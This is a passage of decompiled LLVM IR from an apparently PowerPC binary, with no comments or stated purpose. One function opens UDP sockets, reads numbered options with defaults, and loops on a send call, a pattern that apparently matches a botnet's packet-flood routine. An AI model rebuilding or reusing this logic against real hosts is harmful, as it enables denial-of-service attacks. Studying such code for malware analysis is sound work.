  uselistorder i32* %r14.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 27, 23, 24, 25, 26, 28, 29, 30, 0, 1 }
  uselistorder i1* %cr4_lt.global-to-local, { 1, 0, 2 }
  uselistorder i32 42, { 2, 0, 3, 1, 4 }
  uselistorder i8 4, { 3, 4, 0, 1, 2 }
  uselistorder i32 46, { 2, 0, 3, 1, 4 }
  uselistorder i32 41, { 4, 0, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 (i32, i32*, i32, i32, i32)* @function_10002140, { 1, 0 }
  uselistorder label %dec_label_pc_100041a4, { 1, 0 }
  uselistorder label %dec_label_pc_10004190, { 1, 0 }
  uselistorder label %dec_label_pc_1000408c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004024, { 1, 0 }
  uselistorder label %dec_label_pc_10004020, { 1, 0 }
  uselistorder label %dec_label_pc_10003f44, { 1, 0 }
}

define i32 @function_10004204(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10004204:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v0_1000420c = call i32 @__asm_mfcr()
  store i32 %v0_1000420c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r25.global-to-local, align 4
  %v0_10004238 = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004240 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 268452452, i32* @lr, align 4
  %v2_10004260 = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_10004260, i32* %r27.global-to-local, align 4
  %v0_1000426c = load i32, i32* @r30, align 4
  store i32 %v0_1000426c, i32* %r3.global-to-local, align 4
  store i32 268452468, i32* @lr, align 4
  %v2_10004270 = call i32 @function_10008ec0(i32 %v0_1000426c, i32 4)
  %v0_10004278 = load i32, i32* @r28, align 4
  store i32 %v2_10004270, i32* %r26.global-to-local, align 4
  %v0_10004288 = load i32, i32* @r29, align 4
  store i32 %v0_10004288, i32* %r3.global-to-local, align 4
  store i32 268452496, i32* @lr, align 4
  %v4_1000428c = inttoptr i32 %v0_10004278 to i32*
  %v5_1000428c = call i32 @function_100021c0(i32 %v0_10004288, i32* %v4_1000428c, i32 7, i32 65535)
  %v0_10004298 = load i32, i32* @r28, align 4
  %v1_100042a0 = urem i32 %v5_1000428c, 65536
  store i32 %v1_100042a0, i32* %r21.global-to-local, align 4
  %v0_100042a4 = load i32, i32* @r29, align 4
  store i32 %v0_100042a4, i32* %r3.global-to-local, align 4
  store i32 268452524, i32* @lr, align 4
  %v4_100042a8 = inttoptr i32 %v0_10004298 to i32*
  %v5_100042a8 = call i32 @function_100021c0(i32 %v0_100042a4, i32* %v4_100042a8, i32 6, i32 65535)
  %v0_100042ac = load i32, i32* @r28, align 4
  %v1_100042b0 = urem i32 %v5_100042a8, 65536
  store i32 %v1_100042b0, i32* %r22.global-to-local, align 4
  %v0_100042bc = load i32, i32* @r29, align 4
  store i32 %v0_100042bc, i32* %r3.global-to-local, align 4
  store i32 268452548, i32* @lr, align 4
  %v4_100042c0 = inttoptr i32 %v0_100042ac to i32*
  %v5_100042c0 = call i32 @function_100021c0(i32 %v0_100042bc, i32* %v4_100042c0, i32 0, i32 512)
  %v0_100042c4 = load i32, i32* @r28, align 4
  %v1_100042c8 = urem i32 %v5_100042c0, 65536
  store i32 %v1_100042c8, i32* @r31, align 4
  %v0_100042d0 = load i32, i32* @r29, align 4
  store i32 %v0_100042d0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100042dc.70 to i32), i32* @lr, align 4
  %v4_100042d8 = inttoptr i32 %v0_100042c4 to i32*
  %v5_100042d8 = call i32 @function_100021c0(i32 %v0_100042d0, i32* %v4_100042d8, i32 1, i32 1)
  store i32 %v5_100042d8, i32* %r3.global-to-local, align 4
  %v0_100042e8 = load i32, i32* %r22.global-to-local, align 4
  %v4_100042e8 = icmp eq i32 %v0_100042e8, 65535
  %v1_100042f0 = urem i32 %v5_100042d8, 256
  store i32 %v1_100042f0, i32* %r23.global-to-local, align 4
  store i32 0, i32* %stack_var_-72, align 4
  br i1 %v4_100042e8, label %dec_label_pc_100044ec, label %dec_label_pc_10004304

dec_label_pc_10004304:                            ; preds = %dec_label_pc_10004204, %dec_label_pc_100044ec
  %v0_10004304 = load i32, i32* @r30, align 4
  %v1_10004304 = icmp slt i32 %v0_10004304, 0
  %v3_10004304 = icmp eq i32 %v0_10004304, 0
  store i1 %v1_10004304, i1* %cr4_lt.global-to-local, align 1
  store i1 %v3_10004304, i1* %cr4_eq.global-to-local, align 1
  %tmp38 = icmp slt i32 %v0_10004304, 1
  br i1 %tmp38, label %dec_label_pc_100043c4, label %dec_label_pc_1000430c

dec_label_pc_1000430c:                            ; preds = %dec_label_pc_10004304
  %v0_10004310 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10004310, i32* @r28, align 4
  store i32 0, i32* %r24.global-to-local, align 4
  %v0_1000431c = load i32, i32* %r21.global-to-local, align 4
  %v4_1000431c = icmp eq i32 %v0_1000431c, 65535
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 2, i32* %r20.global-to-local, align 4
  %v2_1000446c = ptrtoint i32* %stack_var_-72 to i32
  br i1 %v4_1000431c, label %dec_label_pc_1000443c, label %dec_label_pc_10004330

dec_label_pc_10004330:                            ; preds = %dec_label_pc_1000430c, %dec_label_pc_100043a4
  %v0_1000433c = phi i32 [ %v0_100043b8, %dec_label_pc_100043a4 ], [ 0, %dec_label_pc_1000430c ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_1000433c = add i32 %v0_1000433c, 1
  store i32 %v1_1000433c, i32* %r24.global-to-local, align 4
  store i32 268452676, i32* @lr, align 4
  %v2_10004340 = call i32 @function_10008ec0(i32 65535, i32 1)
  %v0_10004344 = load i32, i32* %r21.global-to-local, align 4
  %v1_10004344 = trunc i32 %v0_10004344 to i16
  %v2_10004344 = load i32, i32* @r28, align 4
  %v3_10004344 = add i32 %v2_10004344, 2
  %v4_10004344 = inttoptr i32 %v3_10004344 to i16*
  store i16 %v1_10004344, i16* %v4_10004344, align 2
  %v1_10004348 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004348 = load i32, i32* %r27.global-to-local, align 4
  %v3_10004348 = add i32 %v2_10004348, %v1_10004348
  %v4_10004348 = inttoptr i32 %v3_10004348 to i32*
  store i32 %v2_10004340, i32* %v4_10004348, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268452700, i32* @lr, align 4
  %v3_10004358 = call i32 @function_10008b34(i32 2, i32 2, i32 17)
  store i32 %v3_10004358, i32* %r3.global-to-local, align 4
  %v3_10004360 = icmp eq i32 %v3_10004358, -1
  %v1_10004368 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004368 = load i32, i32* %r26.global-to-local, align 4
  %v3_10004368 = add i32 %v2_10004368, %v1_10004368
  %v4_10004368 = inttoptr i32 %v3_10004368 to i32*
  store i32 %v3_10004358, i32* %v4_10004368, align 4
  br i1 %v3_10004360, label %dec_label_pc_100044a0, label %dec_label_pc_10004370

dec_label_pc_10004370:                            ; preds = %dec_label_pc_10004330
  %v0_10004370 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10004370, i32* %stack_var_-72, align 4
  store i32 268452736, i32* @lr, align 4
  %v0_1000437c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000437c = call i32 @function_10008900(i32 %v0_1000437c, i32 %v2_1000446c, i32 16)
  store i32 %v3_1000437c, i32* %r3.global-to-local, align 4
  %v0_10004380 = load i32, i32* @r28, align 4
  %v1_10004380 = add i32 %v0_10004380, 20
  %v2_10004380 = inttoptr i32 %v1_10004380 to i8*
  %v3_10004380 = load i8, i8* %v2_10004380, align 1
  %v2_10004384 = icmp ugt i8 %v3_10004380, 31
  br i1 %v2_10004384, label %dec_label_pc_100043a4, label %dec_label_pc_1000438c

dec_label_pc_1000438c:                            ; preds = %dec_label_pc_10004370
  %v1_1000438c = add i32 %v0_10004380, 16
  %v2_1000438c = inttoptr i32 %v1_1000438c to i32*
  %v3_1000438c = load i32, i32* %v2_1000438c, align 4
  store i32 %v3_1000438c, i32* %r29.global-to-local, align 4
  %v0_10004390 = call i32 @function_10006318()
  store i32 %v0_10004390, i32* %r3.global-to-local, align 4
  %v0_10004394 = load i32, i32* @r28, align 4
  %v1_10004394 = add i32 %v0_10004394, 20
  %v2_10004394 = inttoptr i32 %v1_10004394 to i8*
  %v3_10004394 = load i8, i8* %v2_10004394, align 1
  %tmp = urem i8 %v3_10004394, 64
  %v2_10004398 = zext i8 %tmp to i32
  %v3_10004398 = lshr i32 %v0_10004390, %v2_10004398
  %v0_1000439c = load i32, i32* %r29.global-to-local, align 4
  %v2_1000439c = add i32 %v3_10004398, %v0_1000439c
  store i32 %v2_1000439c, i32* %r3.global-to-local, align 4
  %v2_100043a0 = add i32 %v0_10004394, 4
  %v3_100043a0 = inttoptr i32 %v2_100043a0 to i32*
  store i32 %v2_1000439c, i32* %v3_100043a0, align 4
  br label %dec_label_pc_100043a4

dec_label_pc_100043a4:                            ; preds = %dec_label_pc_10004370, %dec_label_pc_1000438c
  %v0_100043a4 = load i32, i32* %r25.global-to-local, align 4
  %v1_100043a4 = load i32, i32* %r26.global-to-local, align 4
  %v2_100043a4 = add i32 %v1_100043a4, %v0_100043a4
  %v3_100043a4 = inttoptr i32 %v2_100043a4 to i32*
  %v4_100043a4 = load i32, i32* %v3_100043a4, align 4
  store i32 %v4_100043a4, i32* @r3, align 4
  %v1_100043b0 = add i32 %v0_100043a4, 4
  store i32 %v1_100043b0, i32* %r25.global-to-local, align 4
  store i32 268452792, i32* @lr, align 4
  %v0_100043b4 = call i32 @function_10008934()
  store i32 %v0_100043b4, i32* %r3.global-to-local, align 4
  %v0_100043b8 = load i32, i32* %r24.global-to-local, align 4
  %v1_100043b8 = load i32, i32* @r30, align 4
  %v4_100043b8 = icmp eq i32 %v0_100043b8, %v1_100043b8
  %v0_100043bc = load i32, i32* @r28, align 4
  %v1_100043bc = add i32 %v0_100043bc, 24
  store i32 %v1_100043bc, i32* @r28, align 4
  br i1 %v4_100043b8, label %dec_label_pc_100043c4, label %dec_label_pc_10004330

dec_label_pc_100043c4:                            ; preds = %dec_label_pc_100043a4, %dec_label_pc_1000441c, %dec_label_pc_10004304
  %v0_100043c4 = load i32, i32* %r23.global-to-local, align 4
  %v3_100043c4 = icmp eq i32 %v0_100043c4, 0
  store i1 %v3_100043c4, i1* %cr3_eq.global-to-local, align 1
  %v0_100043c8.pre = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100043c8.pre = load i1, i1* %cr4_lt.global-to-local, align 1
  br label %dec_label_pc_100043c8.outer

dec_label_pc_100043c8.outer:                      ; preds = %dec_label_pc_100043fc, %dec_label_pc_10004534, %dec_label_pc_100043c4
  %v1_100043c8.ph39 = phi i1 [ %v1_100043c8.pre, %dec_label_pc_100043c4 ], [ %v1_10004534, %dec_label_pc_10004534 ], [ %v1_100043fc, %dec_label_pc_100043fc ]
  %v0_100043c8.ph40 = phi i1 [ %v0_100043c8.pre, %dec_label_pc_100043c4 ], [ %v0_10004534, %dec_label_pc_10004534 ], [ %v0_100043fc, %dec_label_pc_100043fc ]
  %v2_100043c8 = or i1 %v1_100043c8.ph39, %v0_100043c8.ph40
  br label %dec_label_pc_100043c8

dec_label_pc_100043c8:                            ; preds = %dec_label_pc_100043c8.outer, %dec_label_pc_100043c8
  br i1 %v2_100043c8, label %dec_label_pc_100043c8, label %dec_label_pc_100043cc

dec_label_pc_100043cc:                            ; preds = %dec_label_pc_10004534, %dec_label_pc_100043fc, %dec_label_pc_100043c8
  %v0_100043cc = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_100043cc, label %dec_label_pc_100043d0, label %dec_label_pc_100044f8

dec_label_pc_100043d0:                            ; preds = %dec_label_pc_100043cc
  store i32 0, i32* %r28.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100043d8

dec_label_pc_100043d8:                            ; preds = %dec_label_pc_100043d8.dec_label_pc_100043d8_crit_edge, %dec_label_pc_100043d0
  %v0_100043dc = phi i32 [ %v0_100043f4, %dec_label_pc_100043d8.dec_label_pc_100043d8_crit_edge ], [ 0, %dec_label_pc_100043d0 ]
  %v0_100043ec = phi i32 [ %v0_100043d8.pre, %dec_label_pc_100043d8.dec_label_pc_100043d8_crit_edge ], [ 0, %dec_label_pc_100043d0 ]
  %v1_100043d8 = load i32, i32* %r26.global-to-local, align 4
  %v2_100043d8 = add i32 %v1_100043d8, %v0_100043ec
  %v3_100043d8 = inttoptr i32 %v2_100043d8 to i32*
  %v4_100043d8 = load i32, i32* %v3_100043d8, align 4
  store i32 %v4_100043d8, i32* %r3.global-to-local, align 4
  %v1_100043dc = add i32 %v0_100043dc, 1
  store i32 %v1_100043dc, i32* %r28.global-to-local, align 4
  %v1_100043e0 = load i32, i32* %r27.global-to-local, align 4
  %v2_100043e0 = add i32 %v1_100043e0, %v0_100043ec
  %v3_100043e0 = inttoptr i32 %v2_100043e0 to i32*
  %v4_100043e0 = load i32, i32* %v3_100043e0, align 4
  %v0_100043e4 = load i32, i32* @r31, align 4
  %v1_100043ec = add i32 %v0_100043ec, 4
  store i32 %v1_100043ec, i32* %r29.global-to-local, align 4
  store i32 268452852, i32* @lr, align 4
  %v4_100043f0 = call i32 @function_10008a80(i32 %v4_100043d8, i32 %v4_100043e0, i32 %v0_100043e4, i32 16384)
  store i32 %v4_100043f0, i32* %r3.global-to-local, align 4
  %v0_100043f4 = load i32, i32* %r28.global-to-local, align 4
  %v1_100043f4 = load i32, i32* @r30, align 4
  %v4_100043f4 = icmp eq i32 %v0_100043f4, %v1_100043f4
  br i1 %v4_100043f4, label %dec_label_pc_100043fc, label %dec_label_pc_100043d8.dec_label_pc_100043d8_crit_edge

dec_label_pc_100043d8.dec_label_pc_100043d8_crit_edge: ; preds = %dec_label_pc_100043d8
  %v0_100043d8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100043d8

dec_label_pc_100043fc:                            ; preds = %dec_label_pc_100043d8
  %v0_100043fc = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_100043fc = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_100043fc = or i1 %v0_100043fc, %v1_100043fc
  br i1 %v2_100043fc, label %dec_label_pc_100043c8.outer, label %dec_label_pc_100043cc

dec_label_pc_1000441c:                            ; preds = %dec_label_pc_10004480, %dec_label_pc_1000449c
  %v0_1000441c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000441c = load i32, i32* %r26.global-to-local, align 4
  %v2_1000441c = add i32 %v1_1000441c, %v0_1000441c
  %v3_1000441c = inttoptr i32 %v2_1000441c to i32*
  %v4_1000441c = load i32, i32* %v3_1000441c, align 4
  store i32 %v4_1000441c, i32* @r3, align 4
  %v1_10004428 = add i32 %v0_1000441c, 4
  store i32 %v1_10004428, i32* %r25.global-to-local, align 4
  store i32 268452912, i32* @lr, align 4
  %v0_1000442c = call i32 @function_10008934()
  store i32 %v0_1000442c, i32* %r3.global-to-local, align 4
  %v0_10004430 = load i32, i32* %r24.global-to-local, align 4
  %v1_10004430 = load i32, i32* @r30, align 4
  %v4_10004430 = icmp eq i32 %v0_10004430, %v1_10004430
  %v0_10004434 = load i32, i32* @r28, align 4
  %v1_10004434 = add i32 %v0_10004434, 24
  store i32 %v1_10004434, i32* @r28, align 4
  br i1 %v4_10004430, label %dec_label_pc_100043c4, label %dec_label_pc_1000443c

dec_label_pc_1000443c:                            ; preds = %dec_label_pc_1000430c, %dec_label_pc_1000441c
  %v0_10004448 = phi i32 [ %v0_10004430, %dec_label_pc_1000441c ], [ 0, %dec_label_pc_1000430c ]
  store i32 65535, i32* %r3.global-to-local, align 4
  %v1_10004448 = add i32 %v0_10004448, 1
  store i32 %v1_10004448, i32* %r24.global-to-local, align 4
  store i32 268452944, i32* @lr, align 4
  %v2_1000444c = call i32 @function_10008ec0(i32 65535, i32 1)
  store i32 %v2_1000444c, i32* %r3.global-to-local, align 4
  %v1_10004450 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004450 = load i32, i32* %r27.global-to-local, align 4
  %v3_10004450 = add i32 %v2_10004450, %v1_10004450
  %v4_10004450 = inttoptr i32 %v3_10004450 to i32*
  store i32 %v2_1000444c, i32* %v4_10004450, align 4
  %v0_10004454 = call i32 @function_10006318()
  %v1_10004454 = trunc i32 %v0_10004454 to i16
  %v3_10004458 = load i32, i32* @r28, align 4
  %v4_10004458 = add i32 %v3_10004458, 2
  %v5_10004458 = inttoptr i32 %v4_10004458 to i16*
  store i16 %v1_10004454, i16* %v5_10004458, align 2
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268452972, i32* @lr, align 4
  %v3_10004468 = call i32 @function_10008b34(i32 2, i32 2, i32 17)
  store i32 %v3_10004468, i32* %r3.global-to-local, align 4
  %v3_10004470 = icmp eq i32 %v3_10004468, -1
  %v1_10004478 = load i32, i32* %r25.global-to-local, align 4
  %v2_10004478 = load i32, i32* %r26.global-to-local, align 4
  %v3_10004478 = add i32 %v2_10004478, %v1_10004478
  %v4_10004478 = inttoptr i32 %v3_10004478 to i32*
  store i32 %v3_10004468, i32* %v4_10004478, align 4
  br i1 %v3_10004470, label %dec_label_pc_100044a0, label %dec_label_pc_10004480

dec_label_pc_10004480:                            ; preds = %dec_label_pc_1000443c
  %v0_10004480 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10004480, i32* %stack_var_-72, align 4
  store i32 268453008, i32* @lr, align 4
  %v0_1000448c = load i32, i32* %r3.global-to-local, align 4
  %v3_1000448c = call i32 @function_10008900(i32 %v0_1000448c, i32 %v2_1000446c, i32 16)
  store i32 %v3_1000448c, i32* %r3.global-to-local, align 4
  %v0_10004490 = load i32, i32* @r28, align 4
  %v1_10004490 = add i32 %v0_10004490, 20
  %v2_10004490 = inttoptr i32 %v1_10004490 to i8*
  %v3_10004490 = load i8, i8* %v2_10004490, align 1
  %v2_10004494 = icmp ugt i8 %v3_10004490, 31
  br i1 %v2_10004494, label %dec_label_pc_1000441c, label %dec_label_pc_1000449c

dec_label_pc_1000449c:                            ; preds = %dec_label_pc_10004480
  %v1_10004404 = add i32 %v0_10004490, 16
  %v2_10004404 = inttoptr i32 %v1_10004404 to i32*
  %v3_10004404 = load i32, i32* %v2_10004404, align 4
  store i32 %v3_10004404, i32* %r29.global-to-local, align 4
  %v0_10004408 = call i32 @function_10006318()
  store i32 %v0_10004408, i32* %r3.global-to-local, align 4
  %v0_1000440c = load i32, i32* @r28, align 4
  %v1_1000440c = add i32 %v0_1000440c, 20
  %v2_1000440c = inttoptr i32 %v1_1000440c to i8*
  %v3_1000440c = load i8, i8* %v2_1000440c, align 1
  %tmp43 = urem i8 %v3_1000440c, 64
  %v2_10004410 = zext i8 %tmp43 to i32
  %v3_10004410 = lshr i32 %v0_10004408, %v2_10004410
  %v0_10004414 = load i32, i32* %r29.global-to-local, align 4
  %v2_10004414 = add i32 %v3_10004410, %v0_10004414
  store i32 %v2_10004414, i32* %r3.global-to-local, align 4
  %v2_10004418 = add i32 %v0_1000440c, 4
  %v3_10004418 = inttoptr i32 %v2_10004418 to i32*
  store i32 %v2_10004414, i32* %v3_10004418, align 4
  br label %dec_label_pc_1000441c

dec_label_pc_100044a0:                            ; preds = %dec_label_pc_10004330, %dec_label_pc_1000443c
  %v1_100044b4 = call %0 @__asm_mtcrf(i32 24, i32 %v0_1000420c)
  store i32 %v0_10004238, i32* %r28.global-to-local, align 4
  store i32 %v0_10004240, i32* %r29.global-to-local, align 4
  %v0_100044e8 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100044e8

dec_label_pc_100044ec:                            ; preds = %dec_label_pc_10004204
  %v0_100044ec = call i32 @function_10006318()
  store i32 %v0_100044ec, i32* %r3.global-to-local, align 4
  %v1_100044f0 = urem i32 %v0_100044ec, 65536
  store i32 %v1_100044f0, i32* %r22.global-to-local, align 4
  br label %dec_label_pc_10004304

dec_label_pc_100044f8:                            ; preds = %dec_label_pc_100043cc
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 0, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004500

dec_label_pc_10004500:                            ; preds = %dec_label_pc_10004500.dec_label_pc_10004500_crit_edge, %dec_label_pc_100044f8
  %v0_10004508 = phi i32 [ %v0_1000452c, %dec_label_pc_10004500.dec_label_pc_10004500_crit_edge ], [ 0, %dec_label_pc_100044f8 ]
  %v0_10004500 = phi i32 [ %v0_10004500.pre, %dec_label_pc_10004500.dec_label_pc_10004500_crit_edge ], [ 0, %dec_label_pc_100044f8 ]
  %v1_10004500 = load i32, i32* %r27.global-to-local, align 4
  %v2_10004500 = add i32 %v1_10004500, %v0_10004500
  %v3_10004500 = inttoptr i32 %v2_10004500 to i32*
  %v4_10004500 = load i32, i32* %v3_10004500, align 4
  store i32 %v4_10004500, i32* @r29, align 4
  %v0_10004504 = load i32, i32* @r31, align 4
  store i32 %v0_10004504, i32* @r4, align 4
  %v1_10004508 = add i32 %v0_10004508, 1
  store i32 %v1_10004508, i32* %r25.global-to-local, align 4
  store i32 %v4_10004500, i32* @r3, align 4
  %v0_10004510 = call i32 @function_10006544()
  store i32 %v0_10004510, i32* %r3.global-to-local, align 4
  %v0_10004514 = load i32, i32* %r28.global-to-local, align 4
  %v1_10004514 = load i32, i32* %r26.global-to-local, align 4
  %v2_10004514 = add i32 %v1_10004514, %v0_10004514
  %v3_10004514 = inttoptr i32 %v2_10004514 to i32*
  %v4_10004514 = load i32, i32* %v3_10004514, align 4
  store i32 %v4_10004514, i32* %r3.global-to-local, align 4
  %v0_10004518 = load i32, i32* @r29, align 4
  %v0_1000451c = load i32, i32* @r31, align 4
  %v1_10004524 = add i32 %v0_10004514, 4
  store i32 %v1_10004524, i32* %r28.global-to-local, align 4
  store i32 268453164, i32* @lr, align 4
  %v4_10004528 = call i32 @function_10008a80(i32 %v4_10004514, i32 %v0_10004518, i32 %v0_1000451c, i32 16384)
  store i32 %v4_10004528, i32* %r3.global-to-local, align 4
  %v0_1000452c = load i32, i32* %r25.global-to-local, align 4
  %v1_1000452c = load i32, i32* @r30, align 4
  %v4_1000452c = icmp eq i32 %v0_1000452c, %v1_1000452c
  br i1 %v4_1000452c, label %dec_label_pc_10004534, label %dec_label_pc_10004500.dec_label_pc_10004500_crit_edge

dec_label_pc_10004500.dec_label_pc_10004500_crit_edge: ; preds = %dec_label_pc_10004500
  %v0_10004500.pre = load i32, i32* %r28.global-to-local, align 4
  br label %dec_label_pc_10004500

dec_label_pc_10004534:                            ; preds = %dec_label_pc_10004500
  %v0_10004534 = load i1, i1* %cr4_eq.global-to-local, align 1
  %v1_10004534 = load i1, i1* %cr4_lt.global-to-local, align 1
  %v2_10004534 = or i1 %v0_10004534, %v1_10004534
  br i1 %v2_10004534, label %dec_label_pc_100043c8.outer, label %dec_label_pc_100043cc

; uselistorder directives
  uselistorder i1 %v1_10004534, { 1, 0 }
  uselistorder i1 %v0_10004534, { 1, 0 }
  uselistorder i32 %v0_1000452c, { 1, 0 }
  uselistorder i32 %v0_10004514, { 1, 0 }
  uselistorder i32 %v0_1000441c, { 1, 0 }
  uselistorder i1 %v1_100043fc, { 1, 0 }
  uselistorder i1 %v0_100043fc, { 1, 0 }
  uselistorder i32 %v0_100043f4, { 1, 0 }
  uselistorder i32 %v0_100043ec, { 2, 0, 1 }
  uselistorder i32 %v0_100043b8, { 1, 0 }
  uselistorder i32 %v0_100043a4, { 1, 0 }
  uselistorder i32 %v2_1000446c, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 0, 1, 3, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 21, 7, 8, 10, 11, 12, 13, 14, 15, 9, 16, 17, 18, 19, 20, 2, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 0, 1 }
  uselistorder i32* %r26.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r25.global-to-local, { 0, 1, 2, 6, 7, 3, 5, 4, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r24.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r21.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cr4_eq.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32 ()* @function_10006544, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 31, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_100044a0, { 1, 0 }
  uselistorder label %dec_label_pc_1000443c, { 1, 0 }
  uselistorder label %dec_label_pc_1000441c, { 1, 0 }
  uselistorder label %dec_label_pc_100043c8, { 1, 0 }
  uselistorder label %dec_label_pc_100043c8.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100043c4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100043a4, { 1, 0 }
  uselistorder label %dec_label_pc_10004330, { 1, 0 }
  uselistorder label %dec_label_pc_10004304, { 1, 0 }
}

define i32 @function_1000453c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1000453c:
  %cr3_eq.global-to-local = alloca i1, align 1
  %cr4_eq.global-to-local = alloca i1, align 1
  %cr4_lt.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r6.global-to-local, align 4
  store i32 %arg3, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_10004540 = load i32, i32* @lr, align 4
  store i32 %v0_10004540, i32* %r0.global-to-local, align 4
  %v0_10004544 = call i32 @__asm_mfcr()
  store i32 %v0_10004544, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r27.global-to-local, align 4
  store i32 %v0_10004544, i32* %r23.global-to-local, align 4
  %v0_1000457c = load i32, i32* @r28, align 4
  store i32 %arg4, i32* @r28, align 4
  %v0_10004584 = load i32, i32* @r29, align 4
  store i32 %arg3, i32* @r29, align 4
  %v0_1000458c = load i32, i32* @r30, align 4
  store i32 268453292, i32* @lr, align 4
  %v2_100045a8 = call i32 @function_10008ec0(i32 4, i32 4)
  store i32 %v2_100045a8, i32* %r24.global-to-local, align 4
  %v0_100045b0 = load i32, i32* @r28, align 4
  %v0_100045b4 = load i32, i32* @r29, align 4
  store i32 %v0_100045b4, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 268453316, i32* @lr, align 4
  %v4_100045c0 = inttoptr i32 %v0_100045b0 to i32*
  %v5_100045c0 = call i32 @function_100021c0(i32 %v0_100045b4, i32* %v4_100045c0, i32 2, i32 0)
  store i32 65535, i32* %r6.global-to-local, align 4
  store i32 3, i32* %r5.global-to-local, align 4
  %v0_100045d0 = load i32, i32* @r28, align 4
  %v1_100045d4 = urem i32 %v5_100045c0, 256
  store i32 %v1_100045d4, i32* %r19.global-to-local, align 4
  %v0_100045d8 = load i32, i32* @r29, align 4
  store i32 %v0_100045d8, i32* %r3.global-to-local, align 4
  store i32 268453344, i32* @lr, align 4
  %v4_100045dc = inttoptr i32 %v0_100045d0 to i32*
  %v5_100045dc = call i32 @function_100021c0(i32 %v0_100045d8, i32* %v4_100045dc, i32 3, i32 65535)
  %v0_100045e0 = load i32, i32* @r28, align 4
  store i32 4, i32* %r5.global-to-local, align 4
  store i32 64, i32* %r6.global-to-local, align 4
  store i32 %v5_100045dc, i32* %r21.global-to-local, align 4
  %v0_100045f0 = load i32, i32* @r29, align 4
  store i32 %v0_100045f0, i32* %r3.global-to-local, align 4
  store i32 268453368, i32* @lr, align 4
  %v4_100045f4 = inttoptr i32 %v0_100045e0 to i32*
